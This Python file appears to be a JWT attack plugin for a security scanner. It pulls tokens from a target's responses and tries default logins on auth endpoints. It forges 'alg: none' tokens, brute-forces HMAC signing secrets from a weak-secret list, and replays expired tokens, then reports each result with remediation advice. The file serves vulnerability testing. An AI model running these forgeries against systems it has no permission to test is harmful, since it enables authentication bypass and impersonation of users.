"""JWT security analysis and attack plugin.

Tests JSON Web Tokens for common vulnerabilities including algorithm confusion,
weak secrets, expired token acceptance, and sensitive data exposure.
Uses only standard library modules (no external JWT library required).
"""

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from urllib.parse import urlparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target
from nightowl.utils.web_auth import bootstrap_login_from_config

logger = logging.getLogger("nightowl")

# Common weak secrets used in JWT signing
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt_secret",
    "changeme",
    "test",
    "default",
    "qwerty",
    "letmein",
    "jwt",
    "token",
    "12345678",
    "abc123",
    "pass",
    "iloveyou",
    "1234567890",
    "hunter2",
    "p@ssw0rd",
    "supersecret",
    "mysecret",
    "your-256-bit-secret",
    "",
]

# Fields in JWT payload that indicate sensitive data exposure
SENSITIVE_FIELDS = {
    "password",
    "passwd",
    "pwd",
    "pass",
    "secret",
    "token",
    "api_key",
    "apikey",
    "api_secret",
    "private_key",
    "credit_card",
    "cc_number",
    "ssn",
    "social_security",
    "internal_id",
    "db_password",
    "database_url",
    "connection_string",
}

# JWT regex: three base64url segments separated by dots
JWT_REGEX = re.compile(
    r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*"
)


class JWTAttackPlugin(ScannerPlugin):
    name = "jwt-attack"
    description = "Analyze and attack JWT tokens for common vulnerabilities"
    version = "1.0.0"
    stage = "scan"

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings: list[Finding] = []
        url = target.url or f"https://{target.host}"

        try:
            async with self.create_http_client() as client:
                # Fetch the target to extract JWTs from response
                try:
                    resp = await client.get(url, headers=self.get_request_headers())
                except Exception as e:
                    logger.warning(f"JWT attack initial request failed: {e}")
                    return findings

                tokens = self._extract_tokens(resp)

                if not tokens and self.auth_config:
                    try:
                        login_resp = await bootstrap_login_from_config(
                            client,
                            self.auth_config,
                            headers=self.get_request_headers(),
                        )
                        if login_resp is not None:
                            tokens.extend(self._extract_tokens(login_resp))
                    except Exception as exc:
                        logger.debug(f"[jwt-attack] configured auth bootstrap failed: {exc}")

                if not tokens:
                    # Try common auth endpoints
                    auth_paths = ["/api/auth", "/api/login", "/auth/token", "/oauth/token"]
                    for path in auth_paths:
                        try:
                            parsed = urlparse(url)
                            auth_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                            auth_resp = await client.post(
                                auth_url,
                                json={"username": "test", "password": "test"},
                                headers=self.get_request_headers(),
                            )
                            tokens.extend(self._extract_tokens(auth_resp))
                        except (OSError, RuntimeError, ValueError, httpx.RequestError) as exc:
                            logger.debug(f"Suppressed error: {exc}")
                            continue

                if not tokens:
                    logger.info(f"No JWT tokens found for {url}")
                    return findings

                logger.info(f"Found {len(tokens)} JWT token(s) for analysis")

                for token in tokens:
                    # Decode and analyze each token
                    header, payload, signature = self._decode_jwt(token)
                    if header is None or payload is None:
                        continue

                    # ── Check 1: Algorithm None attack ──
                    none_finding = await self._test_alg_none(
                        client, url, token, header, payload
                    )
                    if none_finding:
                        findings.append(none_finding)

                    # ── Check 2: Weak secret brute-force ──
                    weak_finding = self._test_weak_secrets(token, header)
                    if weak_finding:
                        findings.append(weak_finding)

                    # ── Check 3: Expired token acceptance ──
                    expired_finding = await self._test_expired_token(
                        client, url, token, payload
                    )
                    if expired_finding:
                        findings.append(expired_finding)

                    # ── Check 4: Sensitive data in payload ──
                    sensitive_findings = self._check_sensitive_data(payload, token)
                    findings.extend(sensitive_findings)

                    # ── Check 5: Missing critical claims ──
                    claim_finding = self._check_missing_claims(header, payload, token)
                    if claim_finding:
                        findings.append(claim_finding)

        except Exception as e:
            logger.warning(f"JWT attack failed: {e}")

        return findings

    def _extract_tokens(self, resp: httpx.Response) -> list[str]:
        """Extract JWT tokens from response headers, cookies, and body."""
        tokens: list[str] = []
        seen: set[str] = set()

        # Check Authorization header
        auth = resp.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            candidate = auth[7:].strip()
            if JWT_REGEX.match(candidate) and candidate not in seen:
                tokens.append(candidate)
                seen.add(candidate)

        # Check all response headers
        for name, value in resp.headers.items():
            for match in JWT_REGEX.finditer(value):
                t = match.group(0)
                if t not in seen:
                    tokens.append(t)
                    seen.add(t)

        # Check cookies
        for cookie in resp.cookies.jar:
            if JWT_REGEX.match(cookie.value):
                if cookie.value not in seen:
                    tokens.append(cookie.value)
                    seen.add(cookie.value)

        # Check response body
        for match in JWT_REGEX.finditer(resp.text):
            t = match.group(0)
            if t not in seen:
                tokens.append(t)
                seen.add(t)

        return tokens

    def _decode_jwt(
        self, token: str
    ) -> tuple[dict | None, dict | None, str | None]:
        """Decode JWT header and payload without verification."""
        parts = token.split(".")
        if len(parts) != 3:
            return None, None, None

        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
            signature = parts[2]
            return header, payload, signature
        except Exception as e:
            logger.debug(f"JWT decode error: {e}")
            return None, None, None

    def _b64url_decode(self, data: str) -> bytes:
        """Decode base64url string with padding fix."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    def _b64url_encode(self, data: bytes) -> str:
        """Encode bytes to base64url without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _build_jwt(self, header: dict, payload: dict, signature: str = "") -> str:
        """Build a JWT string from components."""
        h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}.{signature}"

    async def _test_alg_none(
        self,
        client: httpx.AsyncClient,
        url: str,
        original_token: str,
        header: dict,
        payload: dict,
    ) -> Finding | None:
        """Test if server accepts JWT with algorithm set to 'none'."""
        none_variants = [
            {"alg": "none"},
            {"alg": "None"},
            {"alg": "NONE"},
            {"alg": "nOnE"},
        ]

        for none_header in none_variants:
            forged_token = self._build_jwt(none_header, payload, "")
            try:
                resp_original = await client.get(
                    url, headers={"Authorization": f"Bearer {original_token}"}
                )
                resp_forged = await client.get(
                    url, headers={"Authorization": f"Bearer {forged_token}"}
                )

                # If the forged token gets a similar success response
                if (
                    resp_forged.status_code == resp_original.status_code
                    and resp_forged.status_code < 400
                    and resp_forged.status_code != 302
                ):
                    return Finding(
                        title="JWT Algorithm None Attack Accepted",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        description=(
                            "Server accepts JWT tokens with algorithm set to 'none', "
                            "allowing complete authentication bypass. An attacker can forge "
                            "arbitrary tokens without knowing the signing key."
                        ),
                        evidence=(
                            f"Original algorithm: {header.get('alg')}\n"
                            f"Forged header: {none_header}\n"
                            f"Original response: {resp_original.status_code}\n"
                            f"Forged response: {resp_forged.status_code}\n"
                            f"Forged token: {forged_token[:80]}..."
                        ),
                        remediation=(
                            "Explicitly validate the JWT algorithm on the server side. "
                            "Reject tokens with 'none' algorithm. Use an allowlist for "
                            "accepted algorithms."
                        ),
                        category="jwt",
                        references=[
                            "https://cwe.mitre.org/data/definitions/327.html",
                            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                        ],
                    )
            except (OSError, RuntimeError, ValueError, httpx.RequestError) as exc:
                logger.debug(f"Suppressed error: {exc}")
                continue

        return None

    def _test_weak_secrets(self, token: str, header: dict) -> Finding | None:
        """Test if JWT is signed with a common weak secret."""
        alg = header.get("alg", "").upper()
        if alg not in ("HS256", "HS384", "HS512"):
            return None

        hash_funcs = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = hash_funcs[alg]
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        original_sig = parts[2]

        for secret in WEAK_SECRETS:
            try:
                computed = hmac.new(
                    secret.encode("utf-8"), signing_input, hash_func
                ).digest()
                computed_sig = self._b64url_encode(computed)
                if computed_sig == original_sig:
                    return Finding(
                        title=f"JWT Signed with Weak Secret: '{secret or '<empty>'}'",
                        severity=Severity.CRITICAL,
                        cvss_score=9.1,
                        description=(
                            f"The JWT is signed with the weak secret '{secret or '<empty>'}'. "
                            "An attacker can forge arbitrary tokens and impersonate any user."
                        ),
                        evidence=(
                            f"Algorithm: {alg}\n"
                            f"Secret found: '{secret}'\n"
                            f"Token (truncated): {token[:80]}..."
                        ),
                        remediation=(
                            "Use a strong, randomly generated secret of at least 256 bits. "
                            "Consider using asymmetric algorithms (RS256, ES256) instead of HMAC."
                        ),
                        category="jwt",
                        references=[
                            "https://cwe.mitre.org/data/definitions/521.html",
                        ],
                    )
            except (OSError, RuntimeError, ValueError, httpx.RequestError) as exc:
                logger.debug(f"Suppressed error: {exc}")
                continue

        return None

    async def _test_expired_token(
        self,
        client: httpx.AsyncClient,
        url: str,
        token: str,
        payload: dict,
    ) -> Finding | None:
        """Check if the server accepts expired JWT tokens."""
        exp = payload.get("exp")
        if exp is None:
            return None

        try:
            exp_ts = int(exp)
        except (ValueError, TypeError):
            return None

        now = int(time.time())
        if exp_ts >= now:
            return None  # token is not yet expired

        # Token is expired -- test if server still accepts it
        try:
            resp = await client.get(
                url, headers={"Authorization": f"Bearer {token}"}
            )
            if resp.status_code < 400 and resp.status_code != 302:
                return Finding(
                    title="Expired JWT Token Accepted",
                    severity=Severity.HIGH,
                    cvss_score=7.4,
                    description=(
                        "Server accepts expired JWT tokens. The token expired at "
                        f"{exp_ts} (current time: {now}). This allows session fixation "
                        "and replay attacks with old tokens."
                    ),
                    evidence=(
                        f"Expiry (exp): {exp_ts}\n"
                        f"Current time: {now}\n"
                        f"Expired {now - exp_ts} seconds ago\n"
                        f"Response status: {resp.status_code}"
                    ),
                    remediation=(
                        "Validate the 'exp' claim server-side. Reject tokens that have expired. "
                        "Implement token refresh mechanisms."
                    ),
                    category="jwt",
                    references=[
                        "https://cwe.mitre.org/data/definitions/613.html",
                    ],
                )
        except (OSError, RuntimeError, ValueError, httpx.RequestError) as exc:
            logger.debug(f"Suppressed error: {exc}")

        return None

    def _check_sensitive_data(self, payload: dict, token: str) -> list[Finding]:
        """Check for sensitive data stored in the JWT payload."""
        findings: list[Finding] = []
        found_fields: list[str] = []

        for key in payload:
            if key.lower() in SENSITIVE_FIELDS:
                found_fields.append(f"{key}={str(payload[key])[:30]}...")

        if found_fields:
            findings.append(
                Finding(
                    title="Sensitive Data Exposed in JWT Payload",
                    severity=Severity.HIGH,
                    cvss_score=6.5,
                    description=(
                        "The JWT payload contains potentially sensitive information "
                        "that is only base64-encoded (not encrypted). Anyone with the "
                        "token can decode and read this data."
                    ),
                    evidence=(
                        f"Sensitive fields found: {', '.join(found_fields)}\n"
                        f"Token (truncated): {token[:80]}..."
                    ),
                    remediation=(
                        "Remove sensitive data from JWT payloads. JWTs are not encrypted by default. "
                        "Use JWE (JSON Web Encryption) if sensitive data must be included, "
                        "or store sensitive data server-side and reference it by ID."
                    ),
                    category="jwt",
                    references=[
                        "https://cwe.mitre.org/data/definitions/315.html",
                    ],
                )
            )

        return findings

    def _check_missing_claims(
        self, header: dict, payload: dict, token: str
    ) -> Finding | None:
        """Check for missing security-critical JWT claims."""
        missing: list[str] = []
        if "exp" not in payload:
            missing.append("exp (expiration)")
        if "iat" not in payload:
            missing.append("iat (issued at)")
        if "iss" not in payload:
            missing.append("iss (issuer)")

        if len(missing) >= 2:
            return Finding(
                title="JWT Missing Critical Security Claims",
                severity=Severity.MEDIUM,
                cvss_score=4.3,
                description=(
                    "The JWT is missing security-relevant claims. Without these, "
                    "the token cannot be properly validated for freshness and origin."
                ),
                evidence=(
                    f"Missing claims: {', '.join(missing)}\n"
                    f"Algorithm: {header.get('alg', 'unknown')}\n"
                    f"Present claims: {', '.join(payload.keys())}"
                ),
                remediation=(
                    "Include exp, iat, iss, and aud claims in all JWTs. "
                    "Validate these claims on every request."
                ),
                category="jwt",
            )

        return None
